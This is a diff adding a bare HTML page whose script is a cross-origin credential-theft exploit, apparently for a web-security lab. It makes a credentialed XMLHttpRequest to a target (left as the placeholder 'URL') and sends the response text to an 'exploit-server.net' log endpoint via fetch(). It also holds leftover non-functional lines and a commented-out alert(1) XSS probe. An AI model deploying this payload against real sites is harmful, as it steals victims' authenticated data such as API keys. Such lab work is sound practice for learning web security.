@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+
+    <h1>Hello World</h1>
+    <script>
+        let myRequest = new XMLHttpRequest();
+        myRequest.open("Get", "URL", true);
+        myRequest.withCredentials = true;
+        myRequest.send(null);
+        myRequest.onreadystatechange = function () {
+            if (this.readyState == XMLHttpRequest.DONE)
+                fetch("https://exploit-0a5e0088036b822b81240793018500dd.exploit-server.net/log/log?key" +
+                    myRequest.responseText)
+            myRequest.HEADERS_RECEIVED
+            document.cookie
+        }
+
+
+        // console.log(response["apikey"])
+    </script>
+    <!-- <script>
+        alert(1)
+    </script> -->
+</body>
+
+</html>
